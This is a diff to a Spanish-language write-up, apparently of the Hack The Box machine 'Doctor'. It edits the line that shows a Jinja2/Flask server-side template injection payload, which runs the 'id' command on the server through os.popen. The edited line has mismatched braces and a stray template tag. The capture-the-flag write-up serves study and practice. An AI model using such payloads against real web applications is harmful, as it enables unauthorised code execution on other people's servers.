@@ -144,7 +144,7 @@ http://doctors.htb/login?next=%2F [200 OK] Bootstrap[4.0.0], Country[RESERVED][Z
 Ahora sí podemos ver, y al ver con Wappalyzer nos muestra que corre Flask. Lanzamos esta payload:
 
 ```python
-{% raw %}{% raw %}{% raw %}{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}{% endraw %}{% endraw %}{% endraw %}
+{request.application.__globals__.__builtins__.__import__('os').popen('id').read()} {% endraw %}
 ```
 
 ![SSTI Payload](/secciones/posts/imagenes/doctor/payload.webp)
